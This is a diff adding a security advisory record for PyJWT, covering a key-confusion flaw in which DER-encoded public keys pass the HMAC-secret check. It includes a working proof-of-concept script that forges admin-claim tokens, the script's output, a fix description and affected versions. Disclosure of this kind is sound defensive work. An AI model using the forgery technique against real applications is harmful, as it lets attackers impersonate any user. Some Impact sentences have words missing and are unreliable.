@@ -1,0 +1,71 @@
+{
+  "id": "GHSA-p4g4-x82p-q773",
+  "modified": "2026-09-29T23:30:03.853857825Z",
+  "published": "2026-09-29T23:14:33Z",
+  "aliases": [
+    "CVE-2026-102271"
+  ],
+  "summary": "PyJWT: Public keys in DER form are accepted as HMAC secrets, bypassing the CVE-2022-29217 guard",
+  "details": "### Summary\n\n`HMACAlgorithm.prepare_key` blocks asymmetric keys from being used as HMAC secrets by searching for text markers only. It looks for `-----BEGIN` and for an `ssh-` prefix. The same key in DER form is binary ASN.1 and has neither marker, so it passes the check and is used as an HMAC secret.\n\nAn application that verifies tokens with an RSA or EC public key, and also allows HS256 with that same key, can be given a forged token. The attacker signs it with the public key, which is public. This is the key confusion problem CVE-2022-29217 was filed for, reachable again through a different encoding.\n\nThe reach is smaller than the original CVE. The application must already be in that misconfiguration, and it must hold its public key as DER bytes rather than PEM.\n\n### Details\n\nThe guard is at `jwt/algorithms.py:331`:\n\n```python\nif is_pem_format(key_bytes) or is_ssh_key(key_bytes):\n    raise InvalidKeyError(\n        \"The specified key is an asymmetric key or x509 certificate and\"\n        \" should not be used as an HMAC secret.\"\n    )\n```\n\nBoth helpers are text matchers. Neither one parses the key.\n\n- `jwt/utils.py:126`, `is_pem_format`, runs a regex for `----[- ]BEGIN ...----`.\n- `jwt/utils.py:141`, `is_ssh_key`, checks `startswith` against a list of `ssh-` and `ecdsa-sha2-` prefixes.\n\nA DER encoded public key starts with the bytes `0x30 0x82`. It matches neither, so `prepare_key` returns it unchanged and it becomes the HMAC secret.\n\nThere is no DER handling anywhere in the package. `grep -rni \"\\bDER\\b|load_der\" jwt/ tests/` returns nothing.\n\nThis affects three encodings that are all blocked in their PEM form today:\n\n- DER SubjectPublicKeyInfo\n- DER PKCS#1\n- DER encoded X.509 certificate\n\nHistory of this guard:\n\n- Added in 2.4.0 for CVE-2022-29217 and GHSA-ffqj-6fqr-9h24, covering PEM and SSH.\n- Extended in 2.13.0 for GHSA-xgmm-8j9v-c9wx, covering JWK JSON documents.\n- DER has never been covered.\n\nApplications that use `PyJWK` or `PyJWKClient` are not affected. `jwt/api_jws.py:395` binds the header `alg` to the key's own algorithm, so HS256 never reaches `HMACAlgorithm.prepare_key` on that path.\n\nSuggested fix: try to parse the bytes as a key and reject if parsing works. For example `load_der_public_key`, `load_der_private_key` and `load_der_x509_certificate` in a try/except chain, next to the checks already there. A random HMAC secret will not parse as valid DER, so real secrets should not be rejected.\n\n### PoC\n\nTested on 2.4.0, on 2.13.0, and on main at commit `7144e4534`. All three behave the same. The guard has been marker based since 2.4.0, so the versions in between are very likely affected as well.\n\n```console\npip install \"pyjwt==2.13.0\" cryptography\npython poc.py\n```\n\nNo special configuration is needed. The script builds its own key.\n\n```python\nimport base64\nimport hashlib\nimport hmac\nimport json\n\nimport jwt\nfrom cryptography.hazmat.primitives.asymmetric import rsa\nfrom cryptography.hazmat.primitives.serialization import Encoding, PublicFormat\n\npub = rsa.generate_private_key(public_exponent=65537, key_size=2048).public_key()\npem = pub.public_bytes(Encoding.PEM, PublicFormat.SubjectPublicKeyInfo)\nder = pub.public_bytes(Encoding.DER, PublicFormat.SubjectPublicKeyInfo)\nder_pkcs1 = pub.public_bytes(Encoding.DER, PublicFormat.PKCS1)\n\n\ndef b64(raw):\n    return base64.urlsafe_b64encode(raw).rstrip(b\"=\")\n\n\ndef forge(secret):\n    # The attacker does not use PyJWT. They only need the public key bytes.\n    head = b64(json.dumps({\"alg\": \"HS256\", \"typ\": \"JWT\"}).encode())\n    body = b64(json.dumps({\"user\": \"admin\", \"role\": \"admin\"}).encode())\n    signing_input = head + b\".\" + body\n    sig = hmac.new(secret, signing_input, hashlib.sha256).digest()\n    return (signing_input + b\".\" + b64(sig)).decode()\n\n\n# PEM form is rejected, as expected since CVE-2022-29217.\ntry:\n    jwt.decode(forge(pem), pem, algorithms=[\"RS256\", \"HS256\"])\nexcept jwt.exceptions.InvalidKeyError as exc:\n    print(\"PEM rejected:\", exc)\n\n# Same key, DER form. The forged token verifies.\nprint(\"DER SPKI accepted:\", jwt.decode(forge(der), der, algorithms=[\"RS256\", \"HS256\"]))\nprint(\"DER PKCS#1 accepted:\", jwt.decode(forge(der_pkcs1), der_pkcs1, algorithms=[\"RS256\", \"HS256\"]))\n```\n\nOutput:\n\n```\nPEM rejected: The specified key is an asymmetric key or x509 certificate and should not be used as an HMAC s\nDER SPKI accepted: {'user': 'admin', 'role': 'admin'}\nDER PKCS#1 accepted: {'user': 'admin', 'role': 'admin'}\n```\n\nThe token is signed with plain `hmac`, so this exercises the verify path only. The PEM and the DER values come from the same key object, so the encoding is the only thing that changes.\n\nWe also have a regression test written in your pytest style. It uses your own `tests/keys` fixtures, covers the DER certificate case too, and fails on current main. Glad to send it or open a PR.\n\n### Impact\n\nKey confusion, CWE-347, improper verification of a cryptographic signature. Same class as CVE-2022-29217.\n\nWho is affected: applications that verify tokens with an asymmetric public key, also list an HS\\* algorithm  pass that public key to `jwt.decode` as DER bytes.\n\nWhat an attacker gets: they can mint tokens with any claims they want, so they can log in as any user. They  is public, and they re-encode it to DER. Nothing secret has to be stolen first.\n\nWhat limits it: the application must already be in the mixed HS\\* and RS\\* misconfiguration. It must also hoEM is the more common form and is still blocked. Users of `PyJWK` and `PyJWKClient` are not affected.\n\n\n\u003e Maintainer update (2026-09-10): We reproduced the issue for DER SubjectPublicKeyInfo, RSA PKCS#1 public-key DER, and DER X.509 certificate inputs when a caller mixes HS* and an asymmetric algorithm and passes the public material as raw bytes. The fix is on master in commit 2798504fa2663364573cf2d1043d8d7fef389499; HMACAlgorithm.prepare_key now rejects DER public keys and certificates when cryptography is available, while arbitrary binary HMAC secrets remain accepted. Verification included the DER regression/control tests, full python -m tox (available environments passed; unavailable interpreters were skipped), Ruff, mypy, packaging, and coverage. The fix has not yet shipped in a release, so this advisory is being moved from triage to draft and will remain unpublished until a supported 2.x release contains the fix. Private-key container formats are outside this fix scope.\n\n## Maintainer update — 2026-09-11\n\nThe verified fix for this advisory is included in PyJWT 2.14.0, released on 2026-09-11 and available on PyPI. PyJWT 2.14.0 is the first release containing the fix. This advisory is now published with 2.14.0 recorded as the patched version.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "pyjwt",
+        "purl": "pkg:pypi/pyjwt"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "2.4.0"
+            },
+            {
+              "fixed": "2.14.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "2.10.0",
+        "2.10.1",
+        "2.11.0",
+        "2.12.0",
+        "2.12.1",
+        "2.13.0",
+        "2.4.0",
+        "2.5.0",
+        "2.6.0",
+        "2.7.0",
+        "2.8.0",
+        "2.9.0"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/09/GHSA-p4g4-x82p-q773/GHSA-p4g4-x82p-q773.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/jpadilla/pyjwt/security/advisories/GHSA-p4g4-x82p-q773"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-102271"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jpadilla/pyjwt/commit/2798504fa2663364573cf2d1043d8d7fef389499"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jpadilla/pyjwt"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jpadilla/pyjwt/releases/tag/2.14.0"
+    }
+  ]
+}
